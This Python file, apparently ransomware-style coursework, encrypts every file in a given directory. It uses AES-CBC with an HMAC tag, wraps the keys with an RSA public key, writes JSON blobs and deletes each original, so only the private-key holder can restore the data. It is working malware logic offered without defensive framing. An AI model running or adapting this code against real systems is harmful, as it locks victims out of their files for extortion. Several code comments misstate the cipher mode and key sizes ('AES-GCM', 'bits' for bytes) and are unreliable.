import os

from fileManagement import saveFileAsJSON
from base64 import b64encode
from cryptography.hazmat.primitives.asymmetric import padding as a_padding
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization, hashes, hmac, padding
from cryptography.hazmat.primitives.ciphers import (
    Cipher, algorithms, modes
)
from keyPaths import keyPaths

key_size = 32
IVLength = 16

def encryptDirectory(filepathToDirectory):
    fileList = os.listdir(filepathToDirectory)
    os.chdir(filepathToDirectory)
    for file in fileList:
         if(not os.path.isdir(file)):
             name, ext = os.path.splitext(file)
             with open(file, "rb") as someData:
                plaintext = someData.read()
             RSAcipher, ciphertext, iv, tag = RSAEncrypt(plaintext,  keyPaths.pathToPublicKey)
             saveFileAsJSON(name + '.json', ciphertext, iv, RSAcipher, tag,  ext)
             os.remove(file)

def messageEncryptMAC (message):

    padder = padding.PKCS7(128).padder() # creates padding 
    padded_data = padder.update(message) + padder.finalize() # pads message to be a muliple of block size for cipher

    ENCKey = os.urandom(key_size)       #creates string of 32 random bits
    HMACKey = os.urandom(key_size)      #creates string of 32 random bits

    ciphertext, iv, tag = encryptMAC(ENCKey, HMACKey, padded_data) # creates ciphertext, IV 
                                                                    #and integrity tag
    return (ciphertext, iv, tag, ENCKey, HMACKey)

def encryptMAC(ENCKey, HMACKey, plaintext):
    if len(HMACKey) < key_size:         # takes length of HMACkey, makes sure it isn't less than 256
        print("Error: the hash key must be greater than 256-bits in length")    # verifies its 256-bits
        return ()

    ciphertext, iv = encrypt(ENCKey, plaintext)       # creates ciphertext and IV using ENCKey and padded plaintext

    h = hmac.HMAC(HMACKey, hashes.SHA256(), backend=default_backend()) #
    h.update(ciphertext)
    tag = h.finalize()  # create integrity tag from HMAC using SHA-256

    return ciphertext, iv, tag

def encrypt(key, plaintext): #-----------------------------------------------------
    if len(key) < key_size:   # checks length of AES key to make sure it's 256 bits
        print("Error: the key must be greater than 256-bits in length")
        return ()

    # Initializes the iv
    iv = os.urandom(IVLength)       # random string of 16 bits
    # Construct an AES-GCM Cipher object with the given key and a
    # randomly generated IV.
    encryptor = Cipher(
        algorithms.AES(key),
        modes.CBC(iv),
        default_backend()
    ).encryptor()

    # Encrypt the plaintext and get the associated ciphertext.
    ciphertext = encryptor.update(plaintext) + encryptor.finalize()

    return (ciphertext, iv)

def RSAEncrypt(message, RSA_Publickey_filepath):

    ciphertext, iv, tag, ENCKey, HMACKey = messageEncryptMAC(message) # pass message to create ciphertext, iv, tag,
                                                                      #                         ENCKey, HMACKey  

    combinedKey = ENCKey + HMACKey                 # concatenates AESKey and HMACKey

    #load
    with open(RSA_Publickey_filepath, "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read(),
            backend=default_backend()
        )
    RSACipher = public_key.encrypt(
        combinedKey,
        a_padding.OAEP(
        mgf=a_padding.MGF1(algorithm=hashes.SHA256()),
        algorithm=hashes.SHA256(),
        label=None
        )
    )

    return(RSACipher, ciphertext, iv, tag)
